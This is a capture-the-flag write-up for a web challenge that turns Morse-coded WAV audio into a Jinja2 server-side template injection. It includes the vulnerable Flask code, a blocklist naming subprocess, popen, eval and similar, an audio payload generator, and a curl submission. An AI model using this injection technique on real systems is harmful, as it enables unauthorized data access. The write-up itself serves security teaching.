# Signal Console (Web, Hard)

**Author:** Pratik Jadhav  
**Category:** Web Exploitation / SSTI  
**Difficulty:** Hard  

## Challenge Description

> Decode a Morse message hidden in a WAV transmission and investigate the signal console.  
> The console only accepts audio signals meeting strict modulation parameters. Once accepted, can you pierce into the vault archive?

**Given:** A web application hosting a signal console at `/signal` and a private archive at `/archive`.  
**Target URL:** `https://byteme-morse-audio-ssti.onrender.com/` (or local `http://127.0.0.1:5000/`)  
**Flag Format:** `OWASP{...}` (or `FLAG{...}`)

## Summary

Signal Console is a multi-stage web exploitation challenge combining audio signal processing with Server-Side Template Injection (SSTI). The application accepts a 16-bit mono 8 kHz WAV audio recording, demodulates the acoustic waveform into Morse code dots and dashes, translates them into ASCII, and passes the decoded text into Jinja2's `render_template_string()`. By inspecting the server's Jinja environment and constructing a custom audio synthesis script, we craft an audio payload encoding `{{ vault["archive"]["transmissions"][0]["metadata"]["decoded"]["payload"] }}`. This payload bypasses the strict character length and keyword blacklists to extract the flag directly from the server's global vault state.

## Flag

```
OWASP{m0rse_aud10_becomes_ssti}
```

*(Local environment default: `FLAG{m0rse_aud10_becomes_ssti}`)*

---

## Step 1 — Application Reconnaissance & Interface Analysis

Navigating to the application root displays a minimalist terminal interface titled **Signal Console** with two primary routes:
- `/signal` — The transmission terminal where users can upload an audio file for signal processing.
- `/archive` — A restricted records page displaying: *"No public records are available."*

Inspecting `/signal` reveals the input specification:
> *"Upload a mono, 16-bit WAV sampled at 8 kHz. Transmissions must be between 0.5 and 120 seconds."*

When submitting an arbitrary audio file, the application attempts to process the file stream and either returns *"Signal processing failed."* or prints the decoded output in a `<pre>` tag under *"Console output"*.

## Step 2 — Source Code & Signal Processing Analysis

Analyzing the server application (`app/app.py`), we trace the complete execution flow from file upload to response rendering:

```python
@app.route("/signal", methods=["GET", "POST"])
def signal():
    rendered, error = "", ""
    if request.method == "POST":
        audio = request.files.get("audio")
        if not audio or not audio.filename:
            error = "Upload a WAV signal."
        else:
            try:
                decoded = decode_wav(audio.stream)
                payload = validate_payload(decoded)
                rendered = render_template_string(payload)
            except Exception:
                error = "Signal processing failed."
    return render_template("signal.html", rendered=rendered, error=error)
```

The request processing involves three distinct stages:

### 1. Audio Demodulation (`decode_wav`)
```python
def decode_wav(fileobj):
    raw = fileobj.read()
    with wave.open(io.BytesIO(raw), "rb") as w:
        if w.getnchannels() != 1 or w.getsampwidth() != 2:
            raise ValueError("mono 16-bit WAV required")
        rate = w.getframerate()
        if rate != 8000:
            raise ValueError("unsupported sampling rate")
        duration = w.getnframes() / rate
        if duration < 0.5 or duration > 120:
            raise ValueError("invalid signal duration")
        frames = w.readframes(w.getnframes())

    samples = [x[0] for x in struct.iter_unpack("<h", frames)]
    active = [abs(x) > 3000 for x in samples]
    ...
```

The audio decoder unpacks signed 16-bit little-endian samples (`<h`) and determines tone presence whenever the sample amplitude satisfies `abs(x) > 3000`. It then analyzes duration runs based on a unit duration of `unit = 0.065` seconds:
- **Tone duration < 2 * unit (~0.13s):** Dot (`.`)
- **Tone duration >= 2 * unit:** Dash (`-`)
- **Silence between 2 * unit and 5 * unit:** Character separator
- **Silence >= 5 * unit (~0.325s):** Word space (` `)

The symbols are mapped back via a reverse Morse lookup table:
```python
MORSE = {
    "A":".-", "B":"-...", "C":"-.-.", "D":"-..", "E":".", "F":"..-.", "G":"--.",
    "H":"....", "I":"..", "J":".---", "K":"-.-", "L":".-..", "M":"--", "N":"-.",
    "O":"---", "P":".--.", "Q":"--.-", "R":".-.", "S":"...", "T":"-", "U":"..-",
    "V":"...-", "W":".--", "X":"-..-", "Y":"-.--", "Z":"--..",
    "0":"-----", "1":".----", "2":"..---", "3":"...--", "4":"....-", "5":".....",
    "6":"-....", "7":"--...", "8":"---..", "9":"----.",
    ".":".-.-.-", ",":"--..--", "?":"..--..", "'":".----.", "!":"-.-.--",
    "/":"-..-.", "(":"-.--.", ")":"-.--.-", "&":".-...", ":":"---...",
    ";":"-.-.-.", "=":"-...-", "+":".-.-.", "-":"-....-", "_":"..--.-",
    '"':".-..-.", "$":"...-..-", "@":".--.-.", "*":".-.-.",
    "{":"--.--", "}":"--..-", "[":".-.-.", "]":"-.-.."
}
REV = {v: (k.lower() if k.isalpha() else k) for k, v in MORSE.items()}
```

Notice that alphabetical characters are converted to lowercase.

### 2. Payload Validation Filter (`validate_payload`)
```python
def validate_payload(payload):
    if len(payload) > 220:
        raise ValueError("transmission rejected")
    if payload.count("{{") != 1 or payload.count("}}") != 1:
        raise ValueError("transmission rejected")

    normalized = re.sub(r"\s+", "", payload).lower()
    blocked = [
        "config", "flag", "self", "request", "session",
        "import", "builtins", "globals", "getattr", "setattr",
        "class", "__", "mro", "subclasses", "open", "eval",
        "exec", "os", "subprocess", "popen"
    ]
    if any(word in normalized for word in blocked):
        raise ValueError("transmission rejected")
    return payload
```

The filter enforces:
1. Maximum length: 220 characters.
2. Template expression bounds: Exactly one `{{` and one `}}`.
3. Strict blacklist: Blocked keywords include standard Jinja sandbox escape attributes (`__class__`, `__mro__`, `__subclasses__`, `builtins`, `import`, `globals`) as well as direct Flask context objects (`config`, `flag`, `self`, `request`, `session`).

### 3. Template Execution
```python
rendered = render_template_string(payload)
```
The validated payload string is directly executed by Jinja2!

## Step 3 — Identifying the Target Object & Payload Construction

Because traditional sandbox escape primitives (`__class__`, `mro`, `subclasses`) and direct context access (`config`, `self`) are banned, we examine the application context and globals registered in Jinja:

```python
vault = {
    "archive": {
        "transmissions": [
            {
                "metadata": {
                    "decoded": {
                        "payload": app.config["FLAG"]
                    }
                }
            }
        ]
    }
}
app.jinja_env.globals["vault"] = vault
```

The server explicitly registers `vault` as a global variable accessible inside any Jinja template evaluation!

Inspecting the nested structure:
- `vault` is a dictionary.
- Key `"archive"` contains a dictionary with key `"transmissions"`.
- `"transmissions"` is a list whose first element (`[0]`) holds `"metadata"`.
- `"metadata"` contains `"decoded"`.
- `"decoded"` contains `"payload"`, which directly holds the flag string!

We assemble the template expression:
```jinja2
{{ vault["archive"]["transmissions"][0]["metadata"]["decoded"]["payload"] }}
```

### Checking the Filter Constraints:
1. **Length:** 76 characters (well within the 220 character threshold).
2. **Expression counts:** Exactly one `{{` and one `}}`.
3. **Blacklist compliance:**
   - `"vault"`, `"archive"`, `"transmissions"`, `0`, `"metadata"`, `"decoded"`, `"payload"`
   - None of these strings contain any substring from `blocked` (`config`, `flag`, `self`, `__`, etc.).
4. **Character legality:**
   - Quotes (`"`): Supported in Morse as `.-..-.`
   - Brackets (`[` and `]`): Supported as `.-.-.` and `-.-..`
   - Curly braces (`{` and `}`): Supported as `--.--` and `--..-`

The payload completely satisfies all validation criteria.

## Step 4 — Synthesizing the Audio Transmission

To deliver the payload, we must generate a valid 8 kHz, 16-bit mono WAV file that the server's `decode_wav()` function will reliably parse.

We write an automated Python script (`solve_morse.py`) to generate sine wave tones (amplitude 16000 > 3000, frequency 750 Hz) with accurate timing intervals:

```python
import io, wave, struct, math, requests

MORSE = {
    "A":".-","B":"-...","C":"-.-.","D":"-..","E":".","F":"..-.","G":"--.",
    "H":"....","I":"..","J":".---","K":"-.-","L":".-..","M":"--","N":"-.",
    "O":"---","P":".--.","Q":"--.-","R":".-.","S":"...","T":"-","U":"..-",
    "V":"...-","W":".--","X":"-..-","Y":"-.--","Z":"--..",
    "0":"-----","1":".----","2":"..---","3":"...--","4":"....-","5":".....",
    "6":"-....","7":"--...","8":"---..","9":"----.",
    ".":".-.-.-",",":"--..--","?":"..--..","'":".----.","!":"-.-.--",
    "/":"-..-.","(":"-.--.",")":"-.--.-","&":".-...",":":"---...",
    ";":"-.-.-.","=":"-...-","+":".-.-.","-":"-....-","_":"..--.-",
    '"':".-..-.", "$":"...-..-","@":".--.-.","*":".-.-.",
    "{":"--.--","}":"--..-","[":".-.-.","]":"-.-.."
}

def generate_tone(duration_sec, sample_rate=8000, freq=750, amp=16000):
    n_samples = int(duration_sec * sample_rate)
    return [int(amp * math.sin(2 * math.pi * freq * i / sample_rate)) for i in range(n_samples)]

def generate_silence(duration_sec, sample_rate=8000):
    return [0] * int(duration_sec * sample_rate)

def text_to_wav(text, filename="payload.wav"):
    unit = 0.065
    rate = 8000
    samples = []

    # Leading silence
    samples.extend(generate_silence(0.1, rate))

    words = text.split(" ")
    for w_idx, word in enumerate(words):
        for c_idx, char in enumerate(word.upper()):
            code = MORSE.get(char)
            if not code:
                continue
            for s_idx, symbol in enumerate(code):
                duration = unit if symbol == "." else unit * 3
                samples.extend(generate_tone(duration, rate))
                if s_idx < len(code) - 1:
                    samples.extend(generate_silence(unit, rate))
            if c_idx < len(word) - 1:
                samples.extend(generate_silence(unit * 3, rate))
        if w_idx < len(words) - 1:
            samples.extend(generate_silence(unit * 7, rate))

    samples.extend(generate_silence(0.1, rate))

    with wave.open(filename, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        packed = struct.pack(f"<{len(samples)}h", *samples)
        w.writeframes(packed)
    print(f"[+] Successfully wrote {filename} (Duration: {len(samples)/rate:.2f}s)")

payload = '{{ vault["archive"]["transmissions"][0]["metadata"]["decoded"]["payload"] }}'
text_to_wav(payload, "exploit.wav")
```

Running the generator produces `exploit.wav` with a duration of approximately 34 seconds, safely under the 120-second cap.

## Step 5 — Submitting the Exploit & Retrieving the Flag

We upload `exploit.wav` via `curl` to the target `/signal` endpoint:

```bash
curl -X POST https://byteme-morse-audio-ssti.onrender.com/signal \
     -F "audio=@exploit.wav"
```

### Server Response:
```html
<section class="result" aria-labelledby="result-title">
  <h2 id="result-title">Console output</h2>
  <pre>OWASP{m0rse_aud10_becomes_ssti}</pre>
</section>
```

The audio signal is decoded, parsed into the Jinja template expression, and rendered by the server engine to reveal the competition flag.

## Solution Summary

| Parameter | Value |
|---|---|
| Target Endpoint | `/signal` |
| Audio Spec | Mono 16-bit PCM WAV, 8000 Hz |
| Morse Dot / Dash Unit | 0.065s |
| Injected Global | `vault` |
| SSTI Payload | `{{ vault["archive"]["transmissions"][0]["metadata"]["decoded"]["payload"] }}` |
| Flag | `OWASP{m0rse_aud10_becomes_ssti}` |

## Root Cause & Vulnerability Explanation

1. **Unsafe Template Evaluation:** The application takes user-controllable input from an untrusted audio upload and directly feeds it into `render_template_string()`. Dynamic template compilation should never be performed on unescaped or user-provided strings.
2. **Global Namespace Exposure:** The sensitive competition secret was placed inside a dictionary exposed to the global Jinja execution environment (`app.jinja_env.globals["vault"] = vault`), allowing legitimate template expressions to traverse object hierarchies without invoking blacklisted attributes like `__class__` or `config`.
3. **Flawed Security Through Obscurity:** Layering audio modulation (Morse code steganography) on top of an SSTI injection sink creates friction for automated scanners, but does not prevent determined exploitation once the decoding logic is reverse-engineered.

## Tools Used

- **Python (`wave`, `struct`, `math`)** — Custom audio synthesis script to generate modulated Morse WAV signals.
- **cURL / Requests** — Sending multipart form data to `/signal`.
- **Audacity** — Visual waveform verification and timing inspection.

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Reconnaissance of `/signal` and `/archive` | Identified 8 kHz WAV upload and restricted records notice |
| 2 | Code analysis of `app.py` | Discovered audio-to-Morse decoding feeding `render_template_string` |
| 3 | Template filter audit | Identified `vault` in `jinja_env.globals` bypassing blacklist keywords |
| 4 | Signal synthesis | Synthesized `exploit.wav` using custom Python tone generator |
| 5 | Submission | Uploaded payload to `/signal` and obtained `OWASP{m0rse_aud10_becomes_ssti}` |
